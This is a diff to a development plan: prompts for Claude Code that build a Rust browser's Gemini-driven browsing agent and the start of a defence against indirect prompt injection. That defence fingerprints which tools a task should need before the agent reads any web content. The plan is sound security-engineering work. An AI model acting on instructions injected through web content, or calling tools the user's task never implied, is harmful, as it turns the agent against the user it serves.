@@ -1065,7 +1065,2014 @@ In crates/ferrite-ui/src/lib.rs:
 ```
 Exit condition: `cargo run -p ferrite-shell ui --features ferrite-servo/servo`. Navigate to example.com. Open the JS Console panel. Type `document.title` and press Enter — the page title appears in the output. Type `1 + 1` — output shows "2". Type a syntax error — output shows the error in red. The audit log shows JsExecute entries when refreshed.
 
-## Task 9: Tool Decision Engine (`ferrite-ipi::tool_decision`)
+## Task 9: Agent Protocol Types (`ferrite-agent` crate)
+### Block 1: Crate scaffold, `BrowserTool`, `AgentRuntime` trait, and `RateLimiter`
+What it does: Creates the `ferrite-agent` crate and defines every type the agent system depends on. `BrowserTool` is the exhaustive set of browser actions. `AgentRuntime` is the trait both the Gemini connector and the IPI dry-run executor implement. `RateLimiter` is a token-bucket guard (2 req/s, burst 5) shared by all LLM backends to prevent runaway API use during testing. Nothing connects to a real LLM yet — only types and traits.
+
+Prompt for Claude Code:
+```
+Create a new library crate at crates/ferrite-agent in the Cargo workspace.
+Add it to workspace members in root Cargo.toml.
+
+In crates/ferrite-agent/Cargo.toml add:
+[dependencies]
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+uuid = { version = "1", features = ["v4"] }
+thiserror = "1"
+async-trait = "0.1"
+tokio = { version = "1", features = ["full"] }
+
+In crates/ferrite-agent/src/lib.rs define the following public types:
+
+// All browser actions an agent can request.
+#[derive(Debug, Clone, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
+pub enum BrowserTool {
+    Navigate(String),
+    ReadPage,
+    ClickElement(String),
+    FillForm { selector: String, value: String },
+    ExtractData(String),
+    ReadClipboard,
+    WriteClipboard(String),
+    ExecuteJs(String),
+    DownloadFile(String),
+}
+
+impl BrowserTool {
+    // Stable string ID used in fingerprinting and audit logs.
+    // Must match the ToolId strings in ferrite-ipi::tool_decision.
+    pub fn tool_id(&self) -> &'static str {
+        match self {
+            BrowserTool::Navigate(_)      => "navigate",
+            BrowserTool::ReadPage         => "dom.read",
+            BrowserTool::ClickElement(_)  => "dom.write",
+            BrowserTool::FillForm { .. }  => "form.fill",
+            BrowserTool::ExtractData(_)   => "dom.read",
+            BrowserTool::ReadClipboard    => "clipboard.read",
+            BrowserTool::WriteClipboard(_)=> "clipboard.write",
+            BrowserTool::ExecuteJs(_)     => "js.execute",
+            BrowserTool::DownloadFile(_)  => "download.file",
+        }
+    }
+}
+
+// A task submitted by the user to the agent.
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct AgentTask {
+    pub session_id: uuid::Uuid,
+    pub task_id: uuid::Uuid,
+    pub prompt: String,
+    pub context_url: Option<String>,
+}
+
+impl AgentTask {
+    pub fn new(prompt: impl Into<String>, context_url: Option<String>) -> Self {
+        Self {
+            session_id: uuid::Uuid::new_v4(),
+            task_id: uuid::Uuid::new_v4(),
+            prompt: prompt.into(),
+            context_url,
+        }
+    }
+}
+
+// One tool call the agent wants to execute.
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct AgentToolCall {
+    pub call_id: uuid::Uuid,
+    pub tool: BrowserTool,
+}
+
+impl AgentToolCall {
+    pub fn new(tool: BrowserTool) -> Self {
+        Self { call_id: uuid::Uuid::new_v4(), tool }
+    }
+}
+
+// The result of executing one tool call.
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct AgentToolResult {
+    pub call_id: uuid::Uuid,
+    pub success: bool,
+    pub data: serde_json::Value,
+    pub error: Option<String>,
+}
+
+impl AgentToolResult {
+    pub fn ok(call_id: uuid::Uuid, data: impl serde::Serialize) -> Self {
+        Self {
+            call_id,
+            success: true,
+            data: serde_json::to_value(data).unwrap_or(serde_json::Value::Null),
+            error: None,
+        }
+    }
+    pub fn err(call_id: uuid::Uuid, error: impl Into<String>) -> Self {
+        Self {
+            call_id,
+            success: false,
+            data: serde_json::Value::Null,
+            error: Some(error.into()),
+        }
+    }
+}
+
+// One complete round-trip: task -> tool calls -> results -> response.
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct AgentTurn {
+    pub turn_id: uuid::Uuid,
+    pub tool_calls: Vec<AgentToolCall>,
+    pub tool_results: Vec<AgentToolResult>,
+    pub final_response: Option<String>,
+    pub is_complete: bool,
+}
+
+impl AgentTurn {
+    pub fn new() -> Self {
+        Self {
+            turn_id: uuid::Uuid::new_v4(),
+            tool_calls: vec![],
+            tool_results: vec![],
+            final_response: None,
+            is_complete: false,
+        }
+    }
+}
+
+#[derive(Debug, thiserror::Error)]
+pub enum AgentError {
+    #[error("API error: {0}")]
+    ApiError(String),
+    #[error("Rate limit exceeded — retry after {retry_after_secs}s")]
+    RateLimit { retry_after_secs: u64 },
+    #[error("Timeout after {0}s")]
+    Timeout(u64),
+    #[error("Parse error: {0}")]
+    ParseError(String),
+    #[error("Tool execution error: {0}")]
+    ToolError(String),
+}
+
+// Implemented by GeminiAgent. The IPI dry-run executor calls this trait.
+#[async_trait::async_trait]
+pub trait AgentRuntime: Send + Sync {
+    async fn run_turn(
+        &self,
+        task: &AgentTask,
+        history: &[AgentTurn],
+        executor: &dyn ToolExecutor,
+    ) -> Result<AgentTurn, AgentError>;
+}
+
+// Executes tool calls on behalf of the agent runtime.
+// Implemented by the Iced bridge in ferrite-ui (real run)
+// and by RecordingExecutor in ferrite-ipi (dry run).
+#[async_trait::async_trait]
+pub trait ToolExecutor: Send + Sync {
+    async fn execute(&self, call: &AgentToolCall) -> AgentToolResult;
+}
+
+// Token-bucket rate limiter. Default: 2 req/s, burst 5.
+// Conservative for testing with real API keys.
+use std::sync::{Arc, Mutex};
+use std::time::{Duration, Instant};
+
+pub struct RateLimiter {
+    inner: Arc<Mutex<RateLimiterState>>,
+}
+
+struct RateLimiterState {
+    tokens: f64,
+    max_tokens: f64,
+    refill_rate: f64,
+    last_refill: Instant,
+}
+
+impl RateLimiter {
+    pub fn new(max_rps: f64, burst: f64) -> Self {
+        Self {
+            inner: Arc::new(Mutex::new(RateLimiterState {
+                tokens: burst,
+                max_tokens: burst,
+                refill_rate: max_rps,
+                last_refill: Instant::now(),
+            })),
+        }
+    }
+
+    // 2 req/s, burst 5. Prevents runaway API usage during testing.
+    pub fn default_testing() -> Self { Self::new(2.0, 5.0) }
+
+    // Returns Ok(()) if a token is available, Err(wait_duration) otherwise.
+    pub fn try_acquire(&self) -> Result<(), Duration> {
+        let mut state = self.inner.lock().unwrap();
+        let now = Instant::now();
+        let elapsed = now.duration_since(state.last_refill).as_secs_f64();
+        state.tokens = (state.tokens + elapsed * state.refill_rate).min(state.max_tokens);
+        state.last_refill = now;
+        if state.tokens >= 1.0 {
+            state.tokens -= 1.0;
+            Ok(())
+        } else {
+            let wait = (1.0 - state.tokens) / state.refill_rate;
+            Err(Duration::from_secs_f64(wait))
+        }
+    }
+
+    // Acquires one token, sleeping if necessary.
+    pub async fn acquire(&self) {
+        loop {
+            match self.try_acquire() {
+                Ok(()) => return,
+                Err(wait) => tokio::time::sleep(wait).await,
+            }
+        }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn agent_task_has_unique_ids() {
+        let t1 = AgentTask::new("search for cats", None);
+        let t2 = AgentTask::new("search for dogs", None);
+        assert_ne!(t1.task_id, t2.task_id);
+    }
+
+    #[test]
+    fn browser_tool_ids_are_stable() {
+        assert_eq!(BrowserTool::Navigate("x".into()).tool_id(), "navigate");
+        assert_eq!(BrowserTool::ReadPage.tool_id(), "dom.read");
+        assert_eq!(BrowserTool::ExecuteJs("".into()).tool_id(), "js.execute");
+    }
+
+    #[test]
+    fn tool_result_ok_serialises() {
+        let id = uuid::Uuid::new_v4();
+        let r = AgentToolResult::ok(id, "page content here");
+        assert!(r.success);
+    }
+
+    #[test]
+    fn rate_limiter_depletes_burst() {
+        let rl = RateLimiter::new(1.0, 3.0);
+        assert!(rl.try_acquire().is_ok());
+        assert!(rl.try_acquire().is_ok());
+        assert!(rl.try_acquire().is_ok());
+        assert!(rl.try_acquire().is_err());
+    }
+}
+```
+Exit condition: `cargo test -p ferrite-agent` — all four unit tests pass. `BrowserTool::tool_id()` strings match the IPI ToolId strings exactly (they will be compared directly in Task 10).
+
+## Task 10: Gemini LLM Backend (`ferrite-agent::gemini`)
+### Block 1: `GeminiAgent` implementing `AgentRuntime` with function calling
+What it does: Implements `AgentRuntime` against the Gemini API using Gemini's native function-calling protocol. The agent sends the task and available tools to Gemini, receives function call responses, executes them via `ToolExecutor`, feeds results back, and loops until Gemini produces a final text response or the turn limit (10) is hit. The rate limiter (2 req/s, burst 5) gates every API call. API key is read from `FERRITE_GEMINI_API_KEY` env var.
+
+Prompt for Claude Code:
+```
+Add to crates/ferrite-agent/Cargo.toml:
+[dependencies]
+reqwest = { version = "0.12", features = ["json", "rustls-tls"], default-features = false }
+
+Create crates/ferrite-agent/src/gemini.rs and implement GeminiAgent.
+
+Public API surface:
+
+pub struct GeminiAgent {
+    api_key: String,
+    model: String,
+    client: reqwest::Client,
+    rate_limiter: RateLimiter,
+}
+
+impl GeminiAgent {
+    // Reads FERRITE_GEMINI_API_KEY from env. Panics if unset.
+    pub fn from_env() -> Self { ... }
+
+    pub fn with_model(mut self, model: impl Into<String>) -> Self { ... }
+}
+
+Constants:
+  GEMINI_API_BASE = "https://generativelanguage.googleapis.com/v1beta/models"
+  DEFAULT_MODEL   = "gemini-2.0-flash"
+  MAX_TURNS_PER_TASK = 10
+  TURN_TIMEOUT_SECS  = 30
+
+Tool manifest — build_tool_manifest() returns a serde_json::Value with
+function_declarations for every BrowserTool variant:
+  browser_navigate(url: string)
+  browser_read_page()
+  browser_click(selector: string)
+  browser_fill_form(selector: string, value: string)
+  browser_extract_data(selector: string)
+  browser_execute_js(script: string)
+  browser_read_clipboard()
+  browser_write_clipboard(content: string)
+  browser_download_file(url: string)
+tool_config: { function_calling_config: { mode: "AUTO" } }
+
+parse_function_call(part: &serde_json::Value) -> Option<AgentToolCall>:
+  Matches "name" field to the function_declaration names above.
+  Returns None for unknown names.
+
+format_tool_results(results, calls) -> serde_json::Value:
+  Returns a Gemini functionResponse content part for each (result, call) pair.
+
+#[async_trait::async_trait]
+impl AgentRuntime for GeminiAgent {
+    async fn run_turn(&self, task, history, executor) -> Result<AgentTurn, AgentError> {
+        // 1. Build system prompt including task.context_url
+        // 2. Build contents array from task.prompt + history turns
+        // 3. Loop up to MAX_TURNS_PER_TASK:
+        //    a. self.rate_limiter.acquire().await
+        //    b. POST to GEMINI_API_BASE/{model}:generateContent?key={api_key}
+        //       with system_instruction, contents, tools, tool_config
+        //    c. tokio::time::timeout(TURN_TIMEOUT_SECS, request)
+        //    d. On 429 -> return Err(AgentError::RateLimit { retry_after_secs: 60 })
+        //    e. On non-2xx -> return Err(AgentError::ApiError(...))
+        //    f. Parse candidates[0].content.parts
+        //    g. If no functionCall parts -> extract text -> set turn.final_response, return Ok
+        //    h. For each functionCall part:
+        //       - parse_function_call -> AgentToolCall
+        //       - executor.execute(&call).await -> AgentToolResult
+        //       - push to turn.tool_calls and turn.tool_results
+        //    i. Append model's functionCall parts and tool results to contents
+        // 4. If loop ends without completion:
+        //    turn.final_response = Some("[agent hit turn limit]")
+        //    turn.is_complete = true
+        //    return Ok(turn)
+    }
+}
+
+In crates/ferrite-agent/src/lib.rs add:
+  pub mod gemini;
+  pub use gemini::GeminiAgent;
+
+In ferrite-shell/src/main.rs add CLI arg "agent-smoke":
+  Requires FERRITE_GEMINI_API_KEY env var.
+  Uses a StubExecutor that returns "stub result for <tool_id>" for every call.
+  Creates GeminiAgent::from_env().
+  Creates AgentTask::new("What is the title of the page at https://example.com?",
+                         Some("https://example.com".to_string())).
+  Calls run_turn(&task, &[], &StubExecutor) inside a tokio runtime.
+  Prints turn.final_response and the number of tool calls made.
+```
+Exit condition: `cargo test -p ferrite-agent` passes. `FERRITE_GEMINI_API_KEY=<key> cargo run -p ferrite-shell -- agent-smoke` prints a non-empty final_response from Gemini and the tool call count. CI skips the smoke test when the env var is absent.
+
+## Task 11: Tool Execution Bridge + Agent Sidebar UI
+### Block 1: Tool executor bridge (agent ↔ Iced main thread channel)
+What it does: Implements `ToolExecutor` for the real browser. The agent runtime runs in a spawned tokio task; tool call requests cross an `mpsc` channel to the Iced main thread where they execute against the live Servo session; results return over a `oneshot` channel. This wiring is what makes the agent actually drive the browser.
+
+Prompt for Claude Code:
+```
+In crates/ferrite-ui/src/lib.rs implement the tool execution bridge:
+
+1. Add to crates/ferrite-ui/Cargo.toml:
+   ferrite-agent = { path = "../ferrite-agent" }
+   tokio = { version = "1", features = ["full"] }
+
+2. At the top of lib.rs define:
+
+   use tokio::sync::oneshot;
+   use ferrite_agent::{AgentToolCall, AgentToolResult};
+
+   pub struct ToolRequest {
+       pub call: AgentToolCall,
+       pub reply: oneshot::Sender<AgentToolResult>,
+   }
+
+   pub type ToolRequestSender   = tokio::sync::mpsc::UnboundedSender<ToolRequest>;
+   pub type ToolRequestReceiver = tokio::sync::mpsc::UnboundedReceiver<ToolRequest>;
+
+3. Add to FerriteBrowser state:
+   - tool_rx: Option<ToolRequestReceiver>
+   - tool_tx: Option<ToolRequestSender>     // cloned when spawning agent tasks
+   - agent_handle: Option<tokio::task::JoinHandle<()>>
+
+   Initialise the unbounded channel in FerriteBrowser::new() / default().
+   Store tx in tool_tx, rx in tool_rx.
+
+4. Add to FerriteBrowserMessage:
+   - ToolRequestArrived(ToolRequest)
+
+5. In update(), handle ToolRequestArrived(req):
+   Execute the tool call synchronously against the active servo session:
+     BrowserTool::Navigate(url)          -> session.navigate(&url); reply ok("")
+     BrowserTool::ReadPage               -> reply ok(session.current_page_text())
+     BrowserTool::ClickElement(sel)      -> session.click(&sel); reply ok("")
+     BrowserTool::FillForm{sel,val}      -> session.fill_form(&sel,&val); reply ok("")
+     BrowserTool::ExtractData(sel)       -> reply ok(session.extract_text(&sel))
+     BrowserTool::ExecuteJs(code)        -> match session.execute_js(&code) {
+                                              Ok(r) => reply ok(r),
+                                              Err(e) => reply err(e)
+                                           }
+     BrowserTool::WriteClipboard(s)      -> reply ok("")
+     _                                   -> reply ok("not yet implemented")
+   Send reply via req.reply (ignore SendError if agent side dropped).
+
+6. Add a Subscription that drains tool_rx and emits ToolRequestArrived:
+   Use iced::subscription::channel to wrap the tokio mpsc receiver.
+   Merge with existing Subscription::batch.
+
+7. Add BrowserToolExecutor struct:
+   pub struct BrowserToolExecutor { pub tx: ToolRequestSender }
+
+   #[async_trait::async_trait]
+   impl ferrite_agent::ToolExecutor for BrowserToolExecutor {
+       async fn execute(&self, call: &AgentToolCall) -> AgentToolResult {
+           let (reply_tx, reply_rx) = oneshot::channel();
+           let _ = self.tx.send(ToolRequest { call: call.clone(), reply: reply_tx });
+           reply_rx.await.unwrap_or_else(|_|
+               AgentToolResult::err(call.call_id, "channel closed"))
+       }
+   }
+```
+Exit condition: `cargo build -p ferrite-ui` compiles with zero errors. The channel types, ToolRequestArrived handler, and BrowserToolExecutor are in place. No agent sessions run yet.
+
+### Block 2: Agent sidebar panel in Iced UI
+What it does: Adds a 320px collapsible sidebar on the right side of the browser window. The user types a task and presses Enter. The sidebar shows the live tool call log as the agent executes and the final answer when it finishes. A toolbar button opens and closes it. This is the primary user interface for the agent.
+
+Prompt for Claude Code:
+```
+In crates/ferrite-ui/src/lib.rs extend FerriteBrowser with the agent sidebar:
+
+1. Add to FerriteBrowser state:
+   - show_agent_sidebar: bool  (default false)
+   - agent_task_input: String
+   - agent_tool_log: Vec<String>   // one entry per tool call: "[navigate] https://..."
+   - agent_response: Option<String>
+   - agent_is_running: bool  (default false)
+
+2. Add to FerriteBrowserMessage:
+   - ToggleAgentSidebar
+   - AgentTaskInputChanged(String)
+   - AgentTaskSubmitted
+   - AgentToolLogged(String)
+   - AgentCompleted(String)
+   - AgentFailed(String)
+   - StopAgent
+
+3. Add to update():
+   - ToggleAgentSidebar -> toggle show_agent_sidebar
+   - AgentTaskInputChanged(s) -> agent_task_input = s
+   - AgentTaskSubmitted -> if not agent_is_running:
+       Clear agent_tool_log, agent_response = None, agent_is_running = true.
+       Build AgentTask from agent_task_input + current tab URL.
+       Clone tool_tx into a BrowserToolExecutor.
+       Spawn tokio task:
+         let agent = GeminiAgent::from_env();
+         let mut history = vec![];
+         loop over run_turn(&task, &history, &executor) until is_complete:
+           For each tool call in the turn, send AgentToolLogged.
+           Push turn to history.
+         On completion send AgentCompleted(final_response).
+         On AgentError send AgentFailed(err.to_string()).
+       Store JoinHandle in agent_handle.
+   - AgentToolLogged(s) -> push s to agent_tool_log
+   - AgentCompleted(s)  -> agent_response = Some(s), agent_is_running = false
+   - AgentFailed(s)     -> agent_response = Some(format!("[error] {}", s)),
+                           agent_is_running = false
+   - StopAgent          -> abort agent_handle, agent_is_running = false
+
+4. In view(), change the main content area to a horizontal Row:
+   Left side: browser viewport (existing Servo frame), fills remaining width.
+   Right side (only when show_agent_sidebar = true):
+     Fixed width 320px.
+     Background: palette.background.weak.color.
+     1px left border: palette.background.strong.color.
+
+     Sidebar layout top-to-bottom:
+
+     Header row:
+       Text "Agent" (size 16, bold) | [Stop] button (only when agent_is_running)
+
+     Separator line.
+
+     Task input:
+       TextInput { placeholder: "Enter a task...", value: agent_task_input }
+       on_input: AgentTaskInputChanged
+       on_submit: AgentTaskSubmitted
+       Disabled + greyed out when agent_is_running = true.
+
+     [Run Task] button -> AgentTaskSubmitted.
+       Disabled when agent_is_running = true or agent_task_input is empty.
+
+     Separator line.
+
+     Tool call log (Scrollable, grows downward):
+       If empty and not running: Text "No active session." (secondary, size 12).
+       Otherwise: for each entry, Row: Text "->" + Text(entry) (size 12).
+       If running: Row: Text "Working..." (secondary, size 12, animated ellipsis).
+
+     Separator (only when agent_response is Some).
+
+     Response box (only when agent_response is Some):
+       Text "Answer" (size 13, bold, secondary colour).
+       Text(response) (size 13, wrapped, primary colour).
+
+5. Add "Agent" toggle button at the right end of the existing toolbar row.
+   Same active/inactive visual style as the "Audit Log" button.
+   Sends ToggleAgentSidebar.
+```
+Exit condition: `cargo run -p ferrite-shell ui`. Toolbar shows "Agent" button. Clicking opens the 320px right sidebar. With `FERRITE_GEMINI_API_KEY` set, typing a task and pressing Enter starts a session. Tool calls appear in the log. Final answer appears when complete. Stop button aborts the session.
+
+## Task 12: IPI — Tool Decision Engine (`ferrite-ipi::tool_decision`)
+### Block 1: `ferrite-ipi` crate skeleton + `ToolId` and `ToolFingerprint` types
+What it does: Creates the `ferrite-ipi` crate and its module structure. Defines `ToolId` — the IPI system's identifier for agent capabilities. Defines `ToolFingerprint` — the expected tool usage profile derived from the user prompt before any web content is seen. `ToolId` strings are intentionally identical to `BrowserTool::tool_id()` output so agent turn records map directly.
+
+Prompt for Claude Code:
+```
+Create a new library crate at crates/ferrite-ipi in the Cargo workspace.
+Add it to workspace members in root Cargo.toml.
+
+In crates/ferrite-ipi/Cargo.toml add:
+[dependencies]
+ferrite-agent = { path = "../ferrite-agent" }
+uuid = { version = "1", features = ["v4"] }
+serde = { version = "1", features = ["derive"] }
+thiserror = "1"
+
+Declare the following public modules in crates/ferrite-ipi/src/lib.rs:
+pub mod tool_decision;
+pub mod sanitizer;
+pub mod twin;
+pub mod containment;
+pub mod dry_run;
+pub mod comparator;
+pub mod dataset;
+
+Create each module as an empty file with a comment: // <module name> — implementation follows.
+
+In crates/ferrite-ipi/src/tool_decision/mod.rs implement:
+
+// Identifies a single browser tool/capability the agent can call.
+// String values must match BrowserTool::tool_id() exactly.
+#[derive(Debug, Clone, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
+pub struct ToolId(pub String);
+
+impl ToolId {
+    pub fn new(s: &str) -> Self { ToolId(s.to_string()) }
+}
+
+impl std::fmt::Display for ToolId {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "{}", self.0)
+    }
+}
+
+// Conversion from BrowserTool so agent turns map directly into IPI records.
+use ferrite_agent::BrowserTool;
+impl From<&BrowserTool> for ToolId {
+    fn from(tool: &BrowserTool) -> Self {
+        ToolId::new(tool.tool_id())
+    }
+}
+
+// The expected tool fingerprint for a task — derived from the user prompt alone,
+// before any web content is processed.
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+pub struct ToolFingerprint {
+    pub session_id: uuid::Uuid,
+    pub task_id: uuid::Uuid,
+    // Tools directly and unambiguously implied by the prompt (rule-based layer).
+    pub must_use: std::collections::HashSet<ToolId>,
+    // Tools plausibly implied by the prompt (LLM complement layer).
+    pub may_use: std::collections::HashSet<ToolId>,
+}
+
+impl ToolFingerprint {
+    pub fn empty(session_id: uuid::Uuid, task_id: uuid::Uuid) -> Self {
+        Self { session_id, task_id,
+               must_use: Default::default(), may_use: Default::default() }
+    }
+    // Returns true if both sets are empty (open-ended prompts).
+    pub fn is_empty(&self) -> bool {
+        self.must_use.is_empty() && self.may_use.is_empty()
+    }
+    // Returns true if the tool is in either set.
+    pub fn contains(&self, tool: &ToolId) -> bool {
+        self.must_use.contains(tool) || self.may_use.contains(tool)
+    }
+    // Merges another fingerprint into this one (accumulation across turns).
+    pub fn merge(&mut self, other: ToolFingerprint) {
+        self.must_use.extend(other.must_use);
+        self.may_use.extend(other.may_use);
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use ferrite_agent::BrowserTool;
+
+    #[test]
+    fn tool_id_from_browser_tool_matches() {
+        assert_eq!(ToolId::from(&BrowserTool::ReadPage), ToolId::new("dom.read"));
+        assert_eq!(ToolId::from(&BrowserTool::ExecuteJs("".into())), ToolId::new("js.execute"));
+        assert_eq!(ToolId::from(&BrowserTool::Navigate("".into())), ToolId::new("navigate"));
+    }
+
+    #[test]
+    fn fingerprint_contains_checks_both_sets() {
+        let mut fp = ToolFingerprint::empty(uuid::Uuid::new_v4(), uuid::Uuid::new_v4());
+        fp.must_use.insert(ToolId::new("email.read"));
+        fp.may_use.insert(ToolId::new("email.send"));
+        assert!(fp.contains(&ToolId::new("email.read")));
+        assert!(fp.contains(&ToolId::new("email.send")));
+        assert!(!fp.contains(&ToolId::new("passwords.read")));
+    }
+
+    #[test]
+    fn fingerprint_merge_accumulates() {
+        let sid = uuid::Uuid::new_v4();
+        let tid = uuid::Uuid::new_v4();
+        let mut fp1 = ToolFingerprint::empty(sid, tid);
+        fp1.must_use.insert(ToolId::new("email.read"));
+        let mut fp2 = ToolFingerprint::empty(sid, tid);
+        fp2.may_use.insert(ToolId::new("report.write"));
+        fp1.merge(fp2);
+        assert!(fp1.must_use.contains(&ToolId::new("email.read")));
+        assert!(fp1.may_use.contains(&ToolId::new("report.write")));
+    }
+}
+```
+Exit condition: `cargo test -p ferrite-ipi` — all three unit tests pass. `ToolId::from(&BrowserTool::ReadPage)` equals `ToolId::new("dom.read")`.
+
+### Block 2: Rule-based matcher — must-use set from prompt keywords
+What it does: Maps common intent keywords in the user prompt to must-use tool sets without involving any model. Covers the ~80% of common tasks where the intent is unambiguous. Returns an empty set for anything it does not recognise — open-ended or unknown prompts get an empty must-use set, which is the safe default.
+
+Prompt for Claude Code:
+```
+In crates/ferrite-ipi/src/tool_decision/mod.rs add:
+
+/// Maps prompt intent keywords to must-use tool sets.
+/// Case-insensitive match on the full prompt string.
+/// Returns empty set for unrecognised prompts.
+pub fn rule_based_must_use(prompt: &str) -> std::collections::HashSet<ToolId> {
+    let lower = prompt.to_lowercase();
+    let mut tools = std::collections::HashSet::new();
+
+    // Email tasks
+    if lower.contains("email") || lower.contains("inbox") || lower.contains("mail") {
+        tools.insert(ToolId::new("email.read"));
+    }
+    if lower.contains("send email") || lower.contains("reply to") || lower.contains("forward") {
+        tools.insert(ToolId::new("email.send"));
+    }
+    if lower.contains("draft") {
+        tools.insert(ToolId::new("email.draft"));
+    }
+
+    // Calendar tasks
+    if lower.contains("calendar") || lower.contains("schedule") || lower.contains("meeting") {
+        tools.insert(ToolId::new("calendar.read"));
+    }
+    if lower.contains("book") || lower.contains("create event") || lower.contains("add meeting") {
+        tools.insert(ToolId::new("calendar.write"));
+    }
+
+    // Navigation tasks
+    if lower.contains("go to") || lower.contains("navigate to") || lower.contains("open") {
+        tools.insert(ToolId::new("navigate"));
+    }
+
+    // Form tasks
+    if lower.contains("fill") || lower.contains("form") || lower.contains("type in") {
+        tools.insert(ToolId::new("form.fill"));
+    }
+    if lower.contains("submit") || lower.contains("click submit") {
+        tools.insert(ToolId::new("form.submit"));
+    }
+
+    // Read / extract tasks
+    if lower.contains("read") || lower.contains("extract") || lower.contains("find on page")
+        || lower.contains("what does") || lower.contains("title of") {
+        tools.insert(ToolId::new("dom.read"));
+    }
+
+    // Download tasks
+    if lower.contains("download") {
+        tools.insert(ToolId::new("download.file"));
+    }
+
+    // JavaScript tasks
+    if lower.contains("javascript") || lower.contains("run script") || lower.contains("execute js") {
+        tools.insert(ToolId::new("js.execute"));
+    }
+
+    // Report / summarise tasks always need dom.read
+    if lower.contains("report") || lower.contains("summarise") || lower.contains("summarize") {
+        tools.insert(ToolId::new("dom.read"));
+        tools.insert(ToolId::new("report.write"));
+    }
+
+    tools
+}
+
+#[cfg(test)]
+mod rule_tests {
+    use super::*;
+
+    #[test]
+    fn email_prompt_gives_email_read() {
+        let tools = rule_based_must_use("Check my inbox and summarise new emails");
+        assert!(tools.contains(&ToolId::new("email.read")));
+    }
+
+    #[test]
+    fn navigate_prompt_gives_navigate() {
+        let tools = rule_based_must_use("Go to https://example.com");
+        assert!(tools.contains(&ToolId::new("navigate")));
+    }
+
+    #[test]
+    fn open_ended_returns_empty() {
+        let tools = rule_based_must_use("Do something interesting");
+        assert!(tools.is_empty());
+    }
+
+    #[test]
+    fn no_false_positives_on_unrelated_prompt() {
+        let tools = rule_based_must_use("What is the weather today?");
+        assert!(!tools.contains(&ToolId::new("email.read")));
+        assert!(!tools.contains(&ToolId::new("form.submit")));
+    }
+}
+```
+Exit condition: `cargo test -p ferrite-ipi` — all four rule tests pass.
+
+### Block 3: LLM complement layer — may-use set via Gemini at temperature 0
+What it does: Sends the user prompt and the tool registry to Gemini at temperature 0 to predict which additional tools the agent might plausibly use beyond the rule-based must-use set. Returns an empty may-use set for open-ended prompts, prompts that produce no parseable tool list, or when the API key is absent. Uses the same `RateLimiter` as the agent backend.
+
+Prompt for Claude Code:
+```
+Add to crates/ferrite-ipi/Cargo.toml:
+[dependencies]
+reqwest = { version = "0.12", features = ["json", "rustls-tls"], default-features = false }
+tokio = { version = "1", features = ["full"] }
+
+In crates/ferrite-ipi/src/tool_decision/mod.rs add:
+
+use ferrite_agent::RateLimiter;
+
+pub struct LlmMayUsePredictor {
+    api_key: String,
+    client: reqwest::Client,
+    rate_limiter: RateLimiter,
+}
+
+impl LlmMayUsePredictor {
+    // Returns None if FERRITE_GEMINI_API_KEY is not set.
+    // Callers must handle None gracefully (fall back to empty may_use set).
+    pub fn from_env() -> Option<Self> {
+        let api_key = std::env::var("FERRITE_GEMINI_API_KEY").ok()?;
+        Some(Self {
+            api_key,
+            client: reqwest::Client::new(),
+            rate_limiter: RateLimiter::default_testing(),
+        })
+    }
+
+    // Predicts the may-use set for a given prompt.
+    // Temperature 0 — deterministic, minimal hallucination risk.
+    // Returns empty set on any error.
+    pub async fn predict(&self, prompt: &str, must_use: &std::collections::HashSet<ToolId>)
+        -> std::collections::HashSet<ToolId>
+    {
+        // Build the tool list string (all tools not already in must_use)
+        let available: Vec<String> = [
+            "email.read", "email.send", "email.draft",
+            "calendar.read", "calendar.write", "contacts.read",
+            "storage.read", "storage.write",
+            "dom.read", "dom.write", "form.fill", "form.submit",
+            "network.fetch", "clipboard.read", "clipboard.write",
+            "download.file", "navigate", "js.execute",
+            "screenshot", "report.write",
+        ]
+        .iter()
+        .filter(|t| !must_use.contains(&ToolId::new(t)))
+        .map(|s| s.to_string())
+        .collect();
+
+        if available.is_empty() { return Default::default(); }
+
+        let system = "You are a security analysis assistant. Given a user task prompt and a \
+                      list of browser tool IDs, respond ONLY with a JSON array of tool ID \
+                      strings that the agent might plausibly use to complete the task — \
+                      beyond the tools already confirmed. If none are plausible, respond \
+                      with an empty array []. Do not explain. Do not add tools the task \
+                      clearly does not need. Err on the side of fewer tools.";
+
+        let user_msg = format!(
+            "Task: {}\n\nAvailable tools: {}\n\nRespond with a JSON array only.",
+            prompt,
+            available.join(", ")
+        );
+
+        self.rate_limiter.acquire().await;
+
+        let payload = serde_json::json!({
+            "system_instruction": { "parts": [{ "text": system }] },
+            "contents": [{ "role": "user", "parts": [{ "text": user_msg }] }],
+            "generationConfig": { "temperature": 0.0, "maxOutputTokens": 256 }
+        });
+
+        let url = format!(
+            "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={}",
+            self.api_key
+        );
+
+        let resp = match tokio::time::timeout(
+            std::time::Duration::from_secs(15),
+            self.client.post(&url).json(&payload).send()
+        ).await {
+            Ok(Ok(r)) => r,
+            _ => return Default::default(),
+        };
+
+        if !resp.status().is_success() { return Default::default(); }
+
+        let body: serde_json::Value = match resp.json().await {
+            Ok(b) => b,
+            Err(_) => return Default::default(),
+        };
+
+        let text = body["candidates"][0]["content"]["parts"][0]["text"]
+            .as_str()
+            .unwrap_or("");
+
+        // Parse JSON array from response
+        let clean = text.trim().trim_start_matches("```json").trim_end_matches("```").trim();
+        let ids: Vec<String> = serde_json::from_str(clean).unwrap_or_default();
+
+        ids.into_iter()
+           .filter(|id| available.contains(id))
+           .map(|id| ToolId::new(&id))
+           .collect()
+    }
+}
+```
